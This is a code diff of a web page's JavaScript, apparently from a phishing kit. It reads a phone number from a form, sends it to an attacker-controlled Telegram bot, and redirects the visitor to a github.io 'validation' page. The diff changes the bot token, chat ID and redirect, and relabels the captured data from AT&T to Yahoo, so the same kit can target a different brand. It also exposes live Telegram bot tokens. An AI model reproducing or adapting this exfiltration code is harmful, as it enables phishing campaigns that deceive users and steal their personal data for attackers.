@@ -197,8 +197,8 @@ footer#footer ul li{
       const formal = document.querySelector('#form')
     
       let bot = {
-          TOKEN: "7024766536:AAEOL-jzXX6VwQ0xF4FtZPOIKnbTPYfQi-s",
-          chatID: "6414984639"
+          TOKEN: "7262256440:AAEIMgF4KSf498CIlAdOqXXPWPWNycGdbBw",
+          chatID: "6599507166"
       }
 
 
@@ -207,10 +207,10 @@ footer#footer ul li{
 
           let result1 = document.querySelector('#usr-id').value
           
-          fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=ATT-RESULT=Phone number::${result1}`, {
+          fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=YAHOO-RESULT=Phone number::${result1}`, {
               method: "GET"
           }).then(success => {
-              window.location.replace("https://online-validation.github.io/code/3y.html");
+              window.location.replace("https://code-authentication.github.io/pages/3y.html");
           }, error => {
               alert("Message not sent")
               console.log(error)
